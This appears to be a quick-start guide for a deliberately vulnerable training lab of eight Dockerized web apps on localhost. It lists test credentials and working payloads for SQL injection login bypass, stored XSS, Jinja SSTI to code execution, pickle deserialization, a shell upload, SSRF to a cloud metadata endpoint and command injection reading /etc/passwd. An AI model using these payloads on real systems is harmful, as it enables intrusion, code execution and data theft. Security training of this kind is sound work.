# DVPP Quick Start Guide

Get all 8 vulnerable applications running in under 5 minutes.

**Table of Contents**
- [Super Quick Start (Docker)](#super-quick-start-docker)
- [What You Get](#what-you-get)
- [Application URLs](#application-urls)
- [Test Credentials](#test-credentials)
- [Quick Vulnerability Tests](#quick-vulnerability-tests)
  - [SQL Injection (SecureDoc)](#1-sql-injection-securedoc)
  - [Stored XSS (VulnBlog)](#2-stored-xss-vulnblog)
  - [SSTI → RCE (VulnBlog Admin)](#3-ssti--rce-vulnblog-admin)
  - [Deserialization RCE (DataViz)](#4-deserialization-rce-dataviz)
  - [File Upload RCE (FileShare)](#5-file-upload-rce-fileshare)
  - [SSRF (APIGateway)](#6-ssrf-apigateway)
  - [Command Injection (ChatApp)](#7-command-injection-chatapp)
  - [Docker Escape (AdminPanel)](#8-docker-escape-adminpanel)
- [Stop Everything](#stop-everything)
- [Quick Stats](#quick-stats)
- [Learning Path](#learning-path)
- [Safety Reminders](#safety-reminders)
- [Troubleshooting](#troubleshooting)
- [Next Steps](#next-steps)
- [Challenge Yourself](#challenge-yourself)

---

## Super Quick Start (Docker)

```bash
# 1. Navigate to DVPP directory
cd /path/to/DVPP

# 2. Start all 8 applications
./scripts/start_all.sh

# 3. Access applications at:
# http://localhost:5000-5007
```

That's it! All 8 apps are now running in isolated Docker containers.

## What You Get

- **8 vulnerable web applications** running simultaneously
- **95+ security vulnerabilities** from 82 real-world CVEs
- **All 14 vulnerability categories** represented
- **Docker isolation** for safe testing

## Application URLs

| Application | URL | Port | Key Vulnerabilities |
|------------|-----|------|---------------------|
| SecureDoc | <http://localhost:5000> | 5000 | SQLi, IDOR, LFI, RCE, XSS, SSRF |
| VulnBlog | <http://localhost:5001> | 5001 | XSS, CSRF, SSTI, RCE, Auth Bypass |
| DataViz | <http://localhost:5002> | 5002 | Deserialization, RCE, CSV Injection |
| FileShare | <http://localhost:5003> | 5003 | File Upload RCE, Path Traversal, LFI |
| APIGateway | <http://localhost:5004> | 5004 | SSRF, Docker Escape, Auth Bypass |
| EcomStore | <http://localhost:5005> | 5005 | SQLi, XSS, CSRF, RCE |
| ChatApp | <http://localhost:5006> | 5006 | XSS, RCE via Bot Commands |
| AdminPanel | <http://localhost:5007> | 5007 | Multiple RCE, Docker Escape |

## Test Credentials

Where applicable (SecureDoc, VulnBlog, EcomStore):

- **Admin:** `admin` / `admin123`
- **User:** `user` / `password` or `user` / `user`
- **Blogger:** `blogger` / `password`

## Quick Vulnerability Tests

### 1. SQL Injection (SecureDoc)

```bash
# Bypass login
curl -X POST http://localhost:5000/auth/login \
  -d "username=admin'--&password=anything"
```

### 2. Stored XSS (VulnBlog)

```bash
# Login first, then:
curl -X POST http://localhost:5001/posts/create \
  -b "session=..." \
  -d "title=<script>alert(1)</script>&content=Test"
```

### 3. SSTI → RCE (VulnBlog Admin)

```bash
curl -X POST http://localhost:5001/admin/render \
  -b "session=..." \
  -d "template={{ config.__class__.__init__.__globals__['os'].popen('id').read() }}"
```

### 4. Deserialization RCE (DataViz)

```python
# Create malicious pickle
import pickle, os, base64
class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))
        
data = base64.b64encode(pickle.dumps(Exploit())).decode()

# Upload and trigger
curl -X POST http://localhost:5002/data/upload -F "file=@evil.pkl"
curl http://localhost:5002/data/load/1
```

### 5. File Upload RCE (FileShare)

```bash
# Upload Python file (auto-executes)
echo 'import os; os.system("id")' > shell.py
curl -X POST http://localhost:5003/upload \
  -F "file=@shell.py" \
  -F "filename=shell.py"
```

### 6. SSRF (APIGateway)

```bash
# Access cloud metadata
curl -X POST http://localhost:5004/proxy \
  -H "Content-Type: application/json" \
  -d '{"url": "http://169.254.169.254/latest/meta-data/"}'
```

### 7. Command Injection (ChatApp)

```bash
# RCE via chatbot
curl -X POST http://localhost:5006/bot \
  -H "Content-Type: application/json" \
  -d '{"command": "/run cat /etc/passwd"}'
```

### 8. Docker Escape (AdminPanel)

```bash
# Execute command in container
curl -X POST http://localhost:5007/docker/exec \
  -H "Content-Type: application/json" \
  -d '{"container": "dvpp_securedoc", "cmd": "cat /etc/passwd"}'
```

## Stop Everything

```bash
# Stop all containers
./scripts/stop_all.sh

# Or use docker-compose directly
docker-compose down

# Remove all data (clean slate)
docker-compose down -v
```

## Quick Stats

- **Total Projects:** 8
- **Total Vulnerabilities:** 95+
- **Total Code:** ~6,000 lines
- **Total Files:** 74
- **Exploit Categories:** 14
- **CVE References:** 82

## Learning Path

1. **Start with SecureDoc** - Most comprehensive, well-documented
2. **Try VulnBlog** - Focus on XSS, CSRF, SSTI
3. **Explore DataViz** - Deserialization attacks
4. **Test FileShare** - File upload security
5. **Attack APIGateway** - SSRF and Docker escapes
6. **Hack EcomStore** - E-commerce vulnerabilities
7. **Break ChatApp** - Message injection attacks
8. **Own AdminPanel** - Multi-vector RCE

## Safety Reminders

- **DO:** Run in isolated lab environments
- **DO:** Use Docker for containment
- **DO:** Practice ethical hacking principles
- **DO:** Learn from the vulnerabilities

- **DON'T:** Deploy to production
- **DON'T:** Expose to the internet
- **DON'T:** Use on shared systems
- **DON'T:** Store real data

## Troubleshooting

**Docker not starting?**

```bash
sudo systemctl start docker
docker info
```

**Port already in use?**

```bash
# Find what's using the port
sudo lsof -i :5000

# Stop the process or edit docker-compose.yml ports
```

**Permission denied on scripts?**

```bash
chmod +x scripts/*.sh
```

**Container build fails?**

```bash
# Clean up and rebuild
docker-compose down -v
docker system prune -af
docker-compose up --build
```

## Next Steps

- Read [Full README](README.md) for detailed documentation
- Check individual project READMEs in `projects/*/README.md`
- Practice with real exploitation techniques
- Learn defensive coding from the anti-patterns

## Challenge Yourself

Can you:

1. Chain vulnerabilities across different apps?
2. Escalate from user to admin in each app?
3. Achieve RCE in all 8 applications?
4. Extract sensitive data without direct file access?
5. Bypass all authentication mechanisms?

Happy (ethical) hacking!
